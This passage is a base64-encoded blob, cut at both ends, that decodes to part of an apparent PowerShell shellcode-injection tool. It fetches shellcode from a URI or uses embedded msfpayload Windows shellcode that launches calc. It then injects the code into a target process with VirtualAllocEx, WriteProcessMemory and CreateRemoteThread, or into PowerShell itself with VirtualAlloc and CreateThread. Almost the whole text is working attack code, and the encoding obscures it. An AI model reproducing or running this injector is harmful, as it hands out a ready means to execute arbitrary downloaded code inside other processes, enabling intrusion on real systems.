qZWN0LlByb3h5ID0gJFdlYlByb3h5T2JqZWN0CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gJFdlYkNsaWVudC5Eb3dubG9hZERhdGEoJFVyaSkKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICIkKCRFcnJvclswXS5FeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgfQogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9ICRTaGVsbGNvZGUzMgoKICAgIH0KICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTaGVsbGNvZGUnXSkKICAgIHsKICAgICAgICAjIFVzZXJzIHBhc3NpbmcgaW4gc2hlbGxjb2RlICB0aHJvdWdoIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyIGFyZSByZXNwb25zaWJsZSBmb3IgZW5zdXJpbmcgaXQgdGFyZ2V0cwogICAgICAgICMgdGhlIGNvcnJlY3QgYXJjaGl0ZWNodHVyZSAtIHg4NiB2cy4geDY0LiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHdoYXQgeW91IHByb3ZpZGUgaXQuCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gJFNoZWxsY29kZQogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9ICRTaGVsbGNvZGUzMgogICAgfQogICAgZWxzZQogICAgewogICAgICAgICMgUG9wIGEgY2FsYy4uLiBvciB3aGF0ZXZlciBzaGVsbGNvZGUgeW91IGRlY2lkZSB0byBwbGFjZSBpbiBoZXJlCiAgICAgICAgIyBJIHNpbmNlcmVseSBob3BlIHlvdSB0cnVzdCB0aGF0IHRoaXMgc2hlbGxjb2RlIGFjdHVhbGx5IHBvcHMgYSBjYWxjLi4uCiAgICAgICAgIyBJbnNlcnQgeW91ciBzaGVsbGNvZGUgaGVyZSBpbiB0aGUgZm9yIDB4WFgsMHhYWCwuLi4KICAgICAgICAjIDMyLWJpdCBwYXlsb2FkCiAgICAgICAgIyBtc2ZwYXlsb2FkIHdpbmRvd3MvZXhlYyBDTUQ9ImNtZCAvayBjYWxjIiBFWElURlVOQz10aHJlYWQKICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSBAKDB4ZmMsMHhlOCwweDg5LDB4MDAsMHgwMCwweDAwLDB4NjAsMHg4OSwweGU1LDB4MzEsMHhkMiwweDY0LDB4OGIsMHg1MiwweDMwLDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDUyLDB4MGMsMHg4YiwweDUyLDB4MTQsMHg4YiwweDcyLDB4MjgsMHgwZiwweGI3LDB4NGEsMHgyNiwweDMxLDB4ZmYsMHgzMSwweGMwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweGMxLDB4Y2YsMHgwZCwweDAxLDB4YzcsMHhlMiwweGYwLDB4NTIsMHg1NywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4OGIsMHg1MiwweDEwLDB4OGIsMHg0MiwweDNjLDB4MDEsMHhkMCwweDhiLDB4NDAsMHg3OCwweDg1LDB4YzAsMHg3NCwweDRhLDB4MDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGQwLDB4NTAsMHg4YiwweDQ4LDB4MTgsMHg4YiwweDU4LDB4MjAsMHgwMSwweGQzLDB4ZTMsMHgzYywweDQ5LDB4OGIsMHgzNCwweDhiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGQ2LDB4MzEsMHhmZiwweDMxLDB4YzAsMHhhYywweGMxLDB4Y2YsMHgwZCwweDAxLDB4YzcsMHgzOCwweGUwLDB4NzUsMHhmNCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDMsMHg3ZCwweGY4LDB4M2IsMHg3ZCwweDI0LDB4NzUsMHhlMiwweDU4LDB4OGIsMHg1OCwweDI0LDB4MDEsMHhkMywweDY2LDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDBjLDB4NGIsMHg4YiwweDU4LDB4MWMsMHgwMSwweGQzLDB4OGIsMHgwNCwweDhiLDB4MDEsMHhkMCwweDg5LDB4NDQsMHgyNCwweDI0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1YiwweDViLDB4NjEsMHg1OSwweDVhLDB4NTEsMHhmZiwweGUwLDB4NTgsMHg1ZiwweDVhLDB4OGIsMHgxMiwweGViLDB4ODYsMHg1ZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NmEsMHgwMSwweDhkLDB4ODUsMHhiOSwweDAwLDB4MDAsMHgwMCwweDUwLDB4NjgsMHgzMSwweDhiLDB4NmYsMHg4NywweGZmLDB4ZDUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGJiLDB4ZTAsMHgxZCwweDJhLDB4MGEsMHg2OCwweGE2LDB4OTUsMHhiZCwweDlkLDB4ZmYsMHhkNSwweDNjLDB4MDYsMHg3YywweDBhLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4MCwweGZiLDB4ZTAsMHg3NSwweDA1LDB4YmIsMHg0NywweDEzLDB4NzIsMHg2ZiwweDZhLDB4MDAsMHg1MywweGZmLDB4ZDUsMHg2MywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NjEsMHg2YywweDYzLDB4MDApCgogICAgICAgICMgNjQtYml0IHBheWxvYWQKICAgICAgICAjIG1zZnBheWxvYWQgd2luZG93cy94NjQvZXhlYyBDTUQ9ImNhbGMiIEVYSVRGVU5DPXRocmVhZAogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9IEAoMHhmYywweDQ4LDB4ODMsMHhlNCwweGYwLDB4ZTgsMHhjMCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTEsMHg0MSwweDUwLDB4NTIsMHg1MSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTYsMHg0OCwweDMxLDB4ZDIsMHg2NSwweDQ4LDB4OGIsMHg1MiwweDYwLDB4NDgsMHg4YiwweDUyLDB4MTgsMHg0OCwweDhiLDB4NTIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDIwLDB4NDgsMHg4YiwweDcyLDB4NTAsMHg0OCwweDBmLDB4YjcsMHg0YSwweDRhLDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweDQxLDB4YzEsMHhjOSwweDBkLDB4NDEsMHgwMSwweGMxLDB4ZTIsMHhlZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTIsMHg0MSwweDUxLDB4NDgsMHg4YiwweDUyLDB4MjAsMHg4YiwweDQyLDB4M2MsMHg0OCwweDAxLDB4ZDAsMHg4YiwweDgwLDB4ODgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDQ4LDB4ODUsMHhjMCwweDc0LDB4NjcsMHg0OCwweDAxLDB4ZDAsMHg1MCwweDhiLDB4NDgsMHgxOCwweDQ0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDQwLDB4MjAsMHg0OSwweDAxLDB4ZDAsMHhlMywweDU2LDB4NDgsMHhmZiwweGM5LDB4NDEsMHg4YiwweDM0LDB4ODgsMHg0OCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkNiwweDRkLDB4MzEsMHhjOSwweDQ4LDB4MzEsMHhjMCwweGFjLDB4NDEsMHhjMSwweGM5LDB4MGQsMHg0MSwweDAxLDB4YzEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDM4LDB4ZTAsMHg3NSwweGYxLDB4NGMsMHgwMywweDRjLDB4MjQsMHgwOCwweDQ1LDB4MzksMHhkMSwweDc1LDB4ZDgsMHg1OCwweDQ0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDQwLDB4MjQsMHg0OSwweDAxLDB4ZDAsMHg2NiwweDQxLDB4OGIsMHgwYywweDQ4LDB4NDQsMHg4YiwweDQwLDB4MWMsMHg0OSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkMCwweDQxLDB4OGIsMHgwNCwweDg4LDB4NDgsMHgwMSwweGQwLDB4NDEsMHg1OCwweDQxLDB4NTgsMHg1ZSwweDU5LDB4NWEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDQxLDB4NTgsMHg0MSwweDU5LDB4NDEsMHg1YSwweDQ4LDB4ODMsMHhlYywweDIwLDB4NDEsMHg1MiwweGZmLDB4ZTAsMHg1OCwweDQxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1OSwweDVhLDB4NDgsMHg4YiwweDEyLDB4ZTksMHg1NywweGZmLDB4ZmYsMHhmZiwweDVkLDB4NDgsMHhiYSwweDAxLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQ4LDB4OGQsMHg4ZCwweDAxLDB4MDEsMHgwMCwweDAwLDB4NDEsMHhiYSwweDMxLDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDZmLDB4ODcsMHhmZiwweGQ1LDB4YmIsMHhlMCwweDFkLDB4MmEsMHgwYSwweDQxLDB4YmEsMHhhNiwweDk1LDB4YmQsMHg5ZCwweGZmLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhkNSwweDQ4LDB4ODMsMHhjNCwweDI4LDB4M2MsMHgwNiwweDdjLDB4MGEsMHg4MCwweGZiLDB4ZTAsMHg3NSwweDA1LDB4YmIsMHg0NywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTMsMHg3MiwweDZmLDB4NmEsMHgwMCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNSwweDYzLDB4NjEsMHg2YywweDYzLDB4MDApCiAgICB9CgogICAgaWYgKCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb2Nlc3NJRCddICkKICAgIHsKICAgICAgICAjIEluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgc3BlY2lmaWVkIHByb2Nlc3MgSUQKICAgICAgICAkT3BlblByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBPcGVuUHJvY2VzcwogICAgICAgICRPcGVuUHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtVSW50MzJdLCBbQm9vbF0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJE9wZW5Qcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5Qcm9jZXNzQWRkciwgJE9wZW5Qcm9jZXNzRGVsZWdhdGUpCiAgICAgICAgJFZpcnR1YWxBbGxvY0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jRXgKICAgICAgICAkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVaW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICAgICAkVmlydHVhbEFsbG9jRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEFsbG9jRXhBZGRyLCAkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV3JpdGVQcm9jZXNzTWVtb3J5CiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0J5dGVbXV0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyLCAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUpCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENyZWF0ZVJlbW90ZVRocmVhZAogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlUmVtb3RlVGhyZWFkQWRkciwgJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlKQogICAgICAgICRDbG9zZUhhbmRsZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENsb3NlSGFuZGxlCiAgICAgICAgJENsb3NlSGFuZGxlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0pIChbQm9vbF0pCiAgICAgICAgJENsb3NlSGFuZGxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENsb3NlSGFuZGxlQWRkciwgJENsb3NlSGFuZGxlRGVsZWdhdGUpCiAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUElEOiAkUHJvY2Vzc0lkIgogICAgICAgIAogICAgICAgIGlmICggJEZvcmNlIC1vciAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICdEbyB5b3Ugd2lzaCB0byBjYXJyeSBvdXQgeW91ciBldmlsIHBsYW5zPycsCiAgICAgICAgICAgICAgICAgIkluamVjdGluZyBzaGVsbGNvZGUgaW5qZWN0aW5nIGludG8gJCgoR2V0LVByb2Nlc3MgLUlkICRQcm9jZXNzSWQpLlByb2Nlc3NOYW1lKSAoJFByb2Nlc3NJZCkhIiApICkKICAgICAgICB7CiAgICAgICAgICAgIEluamVjdC1SZW1vdGVTaGVsbGNvZGUgJFByb2Nlc3NJZAogICAgICAgIH0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAjIEluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgY3VycmVudGx5IHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzCiAgICAgICAgJFZpcnR1YWxBbGxvY0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvYwogICAgICAgICRWaXJ0dWFsQWxsb2NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgICAgICRWaXJ0dWFsQWxsb2MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEFsbG9jQWRkciwgJFZpcnR1YWxBbGxvY0RlbGVnYXRlKQogICAgICAgICRWaXJ0dWFsRnJlZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxGcmVlCiAgICAgICAgJFZpcnR1YWxGcmVlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVaW50MzJdLCBbVUludDMyXSkgKFtCb29sXSkKICAgICAgICAkVmlydHVhbEZyZWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEZyZWVBZGRyLCAkVmlydHVhbEZyZWVEZWxlZ2F0ZSkKICAgICAgICAkQ3JlYXRlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ3JlYXRlVGhyZWFkCiAgICAgICAgJENyZWF0ZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkQ3JlYXRlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENyZWF0ZVRocmVhZEFkZHIsICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSkKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdhaXRGb3JTaW5nbGVPYmplY3QKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50MzJdKSAoW0ludF0pCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3QgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIsICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUpCiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbnRvIFBvd2VyU2hlbGwiCiAgICAgICAgCiAgICAgICAgaWYgKCAkRm9yY2UgLW9yICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggJ0RvIHlvdSB3aXNoIHRvIGNhcnJ5IG91dCB5b3VyIGV2aWwgcGxhbnM/JywKICAgICAgICAgICAgICAgICAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbnRvIHRoZSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2VzcyEiICkgKQogICAgICAgIHsKICAgICAgICAgICAgSW5qZWN0LUxvY2FsU2hlbGxjb2RlCiAgICAgICAgfQogICAgfSAgIAp9
